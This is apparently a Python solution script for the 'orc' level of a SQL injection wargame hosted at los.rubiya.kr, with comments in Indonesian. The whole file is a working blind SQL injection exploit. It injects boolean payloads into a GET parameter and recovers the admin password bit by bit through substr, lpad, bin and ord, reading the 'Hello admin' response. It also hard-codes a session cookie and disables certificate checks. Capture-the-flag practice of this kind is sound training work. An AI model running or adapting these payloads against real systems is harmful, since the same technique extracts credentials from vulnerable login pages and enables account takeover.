import requests
requests.packages.urllib3.disable_warnings()
sess= requests.session()
URL= 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php/?pw='
headers= {'Cookie':'PHPSESSID=opqur7j2cgfefe7j1bi2o0tahv'}

passwordLen= 0

# It is GET Parameter
 
# Get Length of Password 
payload= "1' or id='admin' and length(pw)="

""" 
for i in range(1,100):
    tmpPayload= payload+ str(i)+ '%23'
    res = sess.get(url=URL+tmpPayload, headers=headers, verify=False)
 
    if 'Hello admin' in res.text:          # true
        print('[=] Find Password Length : %d' % i)
        passwordLen= i
        break
    else:          # false
        pass   
"""
password = ''
bit = ''
for i in range(1,9):
    for j in range(1, 9):
        payloads = "1' or id='admin' and substr(lpad(bin(ord(substr(pw,{},1))),8,0),{},1)=1 --'".format(i, j)
        #payloads = "' or substr(lpad(bin(ord(substr(pw,{},1))), 8, 0), {}, 1)=1%23".format(i,j)
        res = sess.get(url=URL+payloads, headers=headers, verify=False)
        if "Hello admin" in res.text:
            bit+= '1'
        else:
            bit+= '0'
    
    password += chr(int(bit,2))
    print("Bit karakter %02d : " + bit + " dan hurufnya :" + chr(int(bit,2)))
    bit = ''
print("passnya adalah : " + password)
